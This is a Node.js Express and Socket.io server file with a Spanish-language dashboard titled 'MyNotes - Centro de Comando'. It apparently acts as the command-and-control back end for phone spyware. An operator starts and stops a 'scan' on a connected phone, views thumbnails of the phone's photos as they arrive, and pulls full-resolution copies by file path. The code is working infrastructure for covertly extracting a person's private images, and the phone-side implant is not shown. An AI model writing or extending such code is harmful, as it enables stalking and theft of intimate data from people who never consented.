const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Comando</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; padding: 20px; }
                
                .dashboard {
                    position: sticky; top: 0; z-index: 100;
                    background: #1e1e1e; padding: 15px; border-radius: 10px;
                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
                    margin-bottom: 20px;
                }

                .status-bar { display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: bold; }
                .status-connected { color: #00e676; }
                .status-disconnected { color: #ff1744; }

                /* BOTONES DE CONTROL */
                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
                
                .btn-ctrl { padding: 15px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; font-size: 16px; transition: 0.2s; }
                
                #btnStart { background: #2979ff; } /* Azul */
                #btnStart:active { background: #1565c0; }
                
                #btnStop { background: #d50000; } /* Rojo */
                #btnStop:active { background: #b71c1c; }

                #btnPause { background: #ff9100; grid-column: span 2; margin-top: 5px;} /* Naranja */

                /* Grid de fotos */
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; }
                .card img { width: 100%; height: 100px; object-fit: cover; }
                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
                .btn-req { width: 100%; padding: 8px; border: none; background: #6200ea; color: white; font-weight: bold; cursor: pointer; }
                
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="status-bar">
                    <span>📡 ESTADO: <span id="status" class="status-disconnected">Esperando...</span></span>
                    <span id="counter">0 fotos</span>
                </div>
                
                <div class="controls">
                    <button id="btnStart" class="btn-ctrl" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                    <button id="btnStop" class="btn-ctrl" onclick="sendCommand('stop')">⏹ DETENER</button>
                    <button id="btnPause" class="btn-ctrl" onclick="togglePauseUI()">👀 PAUSAR VISUALIZACIÓN</button>
                </div>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const statusEl = document.getElementById('status');
                const counterEl = document.getElementById('counter');
                const btnPause = document.getElementById('btnPause');

                let photoCount = 0;
                let isUiPaused = false;
                let buffer = [];

                // --- COMANDOS AL CELULAR ---
                function sendCommand(type) {
                    if(type === 'start') {
                        socket.emit('admin_command', { action: 'start_scan' });
                        alert("Orden enviada: Iniciando extracción...");
                    } else if (type === 'stop') {
                        socket.emit('admin_command', { action: 'stop_scan' });
                    }
                }

                // --- CONTROL DE UI (PAUSA VISUAL) ---
                function togglePauseUI() {
                    isUiPaused = !isUiPaused;
                    btnPause.innerText = isUiPaused ? "▶ REANUDAR VISUALIZACIÓN" : "👀 PAUSAR VISUALIZACIÓN";
                    if(!isUiPaused && buffer.length > 0) {
                        buffer.forEach(d => renderCard(d));
                        buffer = [];
                    }
                }

                // --- SOCKETS ---
                socket.on('connection_alert', msg => {
                    statusEl.innerText = msg;
                    statusEl.className = msg.includes("Conectado") ? "status-connected" : "status-disconnected";
                });

                socket.on('new_preview', data => {
                    if(isUiPaused) {
                        buffer.push(data);
                    } else {
                        renderCard(data);
                    }
                });

                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    updateCardToHD(data);
                });

                // --- RENDERING ---
                function renderCard(data) {
                    if(document.getElementById(data.path)) return;
                    photoCount++;
                    counterEl.innerText = photoCount + " fotos";

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.innerHTML = \`
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <button class="btn-req" onclick="pedirHD(this, '\${data.path}')">⚡ HD</button>
                    \`;
                    grid.prepend(div);
                }

                function updateCardToHD(data) {
                    const name = data.name.replace("HD_", "");
                    // Búsqueda simple por contenido HTML (el path está en el onclick)
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        if(c.innerHTML.includes(name) || c.id === data.path) { // Intento de match
                            c.classList.add('hd');
                            c.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
                            c.querySelector('button').innerText = "✅";
                            c.querySelector('button').style.background = "#00c853";
                        }
                    }
                }

                function pedirHD(btn, path) {
                    btn.innerText = "...";
                    socket.emit('order_download', { path: path });
                }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    io.emit('connection_alert', '✅ Celular Conectado');

    // REENVÍO DE DATOS
    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') io.emit('new_preview', data);
        else if (data.dataType === 'full_image') io.emit('receive_full', data);
    });

    // COMANDOS DE ADMIN (WEB -> CELULAR)
    socket.on('admin_command', (cmd) => {
        console.log("Comando Admin:", cmd.action);
        // 'command_start_scan' o 'command_stop_scan'
        socket.broadcast.emit('command_' + cmd.action); 
    });

    // PEDIDO DE DESCARGA
    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));

    socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
